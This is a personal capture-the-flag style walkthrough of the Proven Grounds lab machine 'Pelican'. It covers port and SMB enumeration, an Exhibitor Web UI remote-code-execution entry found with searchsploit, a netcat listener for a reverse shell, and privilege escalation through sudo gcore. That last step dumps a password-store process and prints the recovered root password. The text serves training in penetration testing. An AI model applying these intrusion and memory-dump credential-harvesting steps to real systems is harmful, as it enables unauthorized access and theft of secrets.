# Pelican - Linux - OffSec - Proven Grounds

Completed: August 12, 2026 - 2:00 mins

References:
- https://www.youtube.com/watch?v=RrpB6l8XO1E
- https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/pelican

## Workflow
### Initial Recon
```
nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA Full-Ports-Scan -vvv --open 192.168.231.98

PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp   open  ipp         syn-ack ttl 61 CUPS 2.2
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8080/tcp  open  http        syn-ack ttl 61 Jetty 1.0
8081/tcp  open  http        syn-ack ttl 61 nginx 1.14.2
34051/tcp open  java-rmi    syn-ack ttl 61 Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So there are a number of different things to look at here at initial glance. 

#### port 631 - CUPS 2.2
CUPS version 2.2 uses TCP port 631 by default for the Internet Printing Protocol (IPP) and web administration. If exposed to untrusted networks or the internet, port 631 (along with associated printer discovery services). 
Overall looks like this version is not registering any very obvious exploits but keeping this in mind. 

From the detailed port & service scan what is standing out to me is the information shown on java-rmi configuration. 
We have smb information where it appears that we can log in with guest user? 
```
nmap -Pn -sV -sC --open -p "$(paste -sd, only-ports-list.txt)" 192.168.231.98 -oA detailed-ports-results

34051/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
| smb2-time: 
|   date: 2026-08-12T23:58:30
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-08-12T19:58:32-04:00

nmap -p 445 --script smb-enum-shares 192.168.231.98
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.168.231.98\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba 4.9.5-Debian)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\192.168.231.98\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

// No read and write permissions here but we can see those shares are available. 
nxc smb 192.168.231.98 -u '' -p '' --shares
SMB         192.168.231.98  445    PELICAN          [*] Unix - Samba (name:PELICAN) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.231.98  445    PELICAN          [+] \: 
SMB         192.168.231.98  445    PELICAN          [*] Enumerated shares
SMB         192.168.231.98  445    PELICAN          Share           Permissions     Remark
SMB         192.168.231.98  445    PELICAN          -----           -----------     ------
SMB         192.168.231.98  445    PELICAN          print$                          Printer Drivers                           
SMB         192.168.231.98  445    PELICAN          IPC$                            IPC Service (Samba 4.9.5-Debian)  
```
---

### Web Specifics -- the path to the initial shell 
Apache ZooKeeper version 3.4.6 (revision 1569965, built on February 20, 2014) is a widely deployed open-source coordination service for distributed applications. It runs on TCP port 2181 by default and is frequently encountered during network service enumeration which is what we are seeing in this case.
```
2181/tcp  open  zookeeper   syn-ack ttl 61 Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
```
When looking up "Exhibitor for ZooKeeper v1.0", the first thing that pops up is exploit-db 
Exhibitor Web UI 1.7.1 - Remote Code Execution that shows a text file with more information regarding this exploit specifically. 
```
searchsploit Exhibitor
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Exhibitor Web UI 1.7.1 - Remote Code Execution                                  | java/webapps/48654.txt
-------------------------------------------------------------------------------- ---------------------------------
searchsploit -m 48654
...
Exploit: Exhibitor Web UI 1.7.1 - Remote Code Execution
```
More guidance on the CVE I followed here:
https://osintteam.blog/exhibitor-v1-authenticated-remote-code-execution-rce-exploit-19f2d8603277 

nginx 1.14.2 - redirect to port 8080 that has the exhibitor for ZooKeeper v1.0 
And this is where we will get the initial shell with the CVE
```
http://192.168.231.98:8080/exhibitor/v1/ui/index.html

// remember to start listener first
nc -nvlp 4444
to upgrade the shell in linux: 
/usr/bin/script -qc /bin/bash /dev/null

We are the user charles 
```
<img width="1281" height="740" alt="image" src="https://github.com/user-attachments/assets/a47baa0c-e51d-4367-80ce-3efddface91d" />

### Privilege Escalation 
```
// ran sudo -l and did get /usr/bin/gcore
charles@pelican:/opt/zookeeper$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore

Doing a quick search, I see that gcore is a command-line utility used in Unix and Linux operating systems to generate a core dump of a running process without stopping it. 


// both do the same thing: look for processes running
find / -perm -u+s 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/pppd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/ntfs-3g
/usr/bin/bwrap
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/password-store <- I'd like to know what's here
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/pkexec

// New terminal on attacker machine 
python3 -m http.server 80 -d ../

On the compromised host
cd /tmp
export TERM=xterm (look at why this clears the terminal shell) - this is just an optional thing. 

looks like there is sudo for gcore and what we need to do is find a process that we can read what we are looking for.
ps -aux
PID 949 has the /usr/bin/password-store
sudo /usr/bin/gcore 949  -- this creates a txt file called core.949
cat core.949 
```
Looking at the file contents, it appears that the root credential can be deciphered in the file contents and giving it a try does actually work. 
<img width="434" height="106" alt="image" src="https://github.com/user-attachments/assets/e7a92921-c9d2-41eb-976c-eadf2db2fc21" />

```
su root
ClogKingpinInning731
cd ~
cat proof.txt
```
<img width="337" height="185" alt="image" src="https://github.com/user-attachments/assets/0fefe504-60b7-4534-9d22-fd28ac6d23f8" />
